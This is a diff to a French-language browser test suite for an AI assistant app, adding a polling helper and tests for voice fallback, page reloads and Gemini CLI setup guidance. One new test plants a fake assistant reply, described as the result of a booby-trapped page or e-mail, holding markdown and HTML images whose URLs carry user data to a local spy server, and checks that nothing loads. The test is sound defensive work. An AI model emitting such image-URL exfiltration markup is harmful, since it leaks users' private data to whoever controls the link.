@@ -27,6 +27,21 @@ MAC_VOICES = """
 """
 
 
+async def until(page, expr: str, timeout: float = 10) -> None:
+    """Attend qu'une expression soit vraie dans la page (wait_for_function évalue une chaîne : refusé par la politique
+    de sécurité de l'interface, ce qui est voulu)."""
+    from playwright.async_api import Error
+
+    for _ in range(int(timeout * 20)):
+        try:
+            if await page.evaluate(expr):
+                return
+        except Error:  # la page se recharge : on regarde de nouveau un peu plus tard
+            pass
+        await asyncio.sleep(0.05)
+    raise AssertionError(f"toujours faux après {timeout} s : {expr}")
+
+
 @pytest.fixture
 async def ely_url():
     s = socket.socket()
@@ -96,13 +111,13 @@ async def test_recorded_voice_reads_sentence_by_sentence_and_falls_back(ely_url,
         # « Automatique » : la voix enregistrée, une requête par phrase
         await page.fill(".voice-test input", "Votre train part à 8 h 12 de la gare de Lyon. Pensez à prendre votre billet sur l'application.")
         await page.click(".voice-test button")
-        await page.wait_for_function("window.played === 2")
+        await until(page, "window.played === 2")
         assert [s["text"] for s in xtts] == ["Votre train part à 8 h 12 de la gare de Lyon.", "Pensez à prendre votre billet sur l'application."]
         assert all(s["voice"] == "gert" for s in xtts) and await page.evaluate("window.spoken") == []
         # le service vocal échoue : repli sur la voix du navigateur, sans silence
         await page.fill(".voice-test input", "Le service vocal est en panne ce matin, désolée.")
         await page.click(".voice-test button")
-        await page.wait_for_function("window.spoken.length === 1")
+        await until(page, "window.spoken.length === 1")
         assert await page.evaluate("window.spoken") == [["Google français", "Le service vocal est en panne ce matin, désolée."]]
         await browser.close()
 
@@ -179,7 +194,7 @@ async def test_page_reloads_when_ely_restarts_on_a_new_version(user, fake, monke
         await page.wait_for_timeout(800)  # flux d'événements ouvert
         await page.evaluate("window.ancienne = true")
         await restart("4.0.1 · abcdef0 (01/10/2026)")
-        await page.wait_for_function("window.ancienne === undefined", timeout=20000)
+        await until(page, "window.ancienne === undefined", timeout=20)
         await page.wait_for_selector(".composer textarea")
         await page.wait_for_timeout(800)
         await page.evaluate("window.ancienne = true")
@@ -191,3 +206,80 @@ async def test_page_reloads_when_ely_restarts_on_a_new_version(user, fake, monke
         await browser.close()
     running["server"].should_exit = running["server"].force_exit = True
     await running["task"]
+
+
+async def test_images_from_other_sites_never_load_by_themselves(ely_url, user):
+    """Une réponse manipulée (page ou e-mail piégé lu par Ely) glisse une image dont l'adresse emporte des
+    informations : elle s'affiche comme un lien, que rien ne charge tant qu'on ne clique pas."""
+    import http.server
+    import threading
+
+    from playwright.async_api import async_playwright
+
+    from conftest import new_conversation
+
+    from ely.agent.runner import save_message
+
+    hits = []
+
+    class Spy(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            hits.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *a):
+            pass
+
+    spy = http.server.HTTPServer(("127.0.0.1", 0), Spy)
+    threading.Thread(target=spy.serve_forever, daemon=True).start()
+    leak = f"http://127.0.0.1:{spy.server_port}"
+    cid = new_conversation(user)
+    save_message(cid, None, {"role": "user", "content": "Trouve le traiteur"}, user["id"])
+    save_message(cid, None, {"role": "assistant", "content": f"Voici ![logo du traiteur]({leak}/fuite?d=adresse-de-franck) "
+                                                             f"et <img src='{leak}/fuite2' srcset='{leak}/fuite3 2x'>."}, user["id"])
+    try:
+        async with async_playwright() as p:
+            browser = await p.chromium.launch(executable_path=os.environ["ELY_BROWSER_EXECUTABLE"])
+            ctx = await browser.new_context(locale="fr-FR")
+            await ctx.add_cookies([{"name": "ely_token", "value": auth.create_session(user["id"]), "url": ely_url}])
+            page = await ctx.new_page()
+            await page.goto(f"{ely_url}/?c={cid}")
+            link = page.locator("a", has_text="🖼️ logo du traiteur")
+            await link.wait_for()
+            assert await link.get_attribute("href") == f"{leak}/fuite?d=adresse-de-franck"
+            assert await page.locator("a", has_text="🖼️ 127.0.0.1").count() == 1
+            await asyncio.sleep(0.5)
+            await browser.close()
+    finally:
+        spy.shutdown()
+    assert hits == []
+
+
+async def test_gemini_subscription_row_guides_the_setup(ely_url, user, fake, tmp_path, monkeypatch):
+    """Réglages → Modèles : sans le CLI gemini, la ligne de l'abonnement Google donne les étapes ; « Activer » n'est
+    possible qu'une fois le CLI installé et connecté."""
+    from playwright.async_api import async_playwright
+
+    from ely.config import settings
+    from ely.llm import gemini_cli
+
+    monkeypatch.setattr(settings, "gemini_cli", str(tmp_path / "absent" / "gemini"))
+    monkeypatch.setattr(gemini_cli, "gemini_home", lambda: tmp_path / "vide")
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(executable_path=os.environ["ELY_BROWSER_EXECUTABLE"])
+        ctx = await browser.new_context(locale="fr-FR")
+        await ctx.add_cookies([{"name": "ely_token", "value": auth.create_session(user["id"]), "url": ely_url}])
+        page = await ctx.new_page()
+        errors = []
+        page.on("pageerror", lambda e: errors.append(str(e)))
+        await page.goto(ely_url)
+        await page.click(".settings-btn")
+        await page.click(".sheet nav button:has-text('Modèles')")
+        row = page.locator(".srow", has_text="Abonnement Google Gemini")
+        await row.wait_for()
+        text = await row.inner_text()
+        assert "npm install -g @google/gemini-cli" in text and "Sign in with Google" in text
+        assert await row.locator("button:has-text('Activer')").is_disabled()
+        await browser.close()
+    assert errors == []
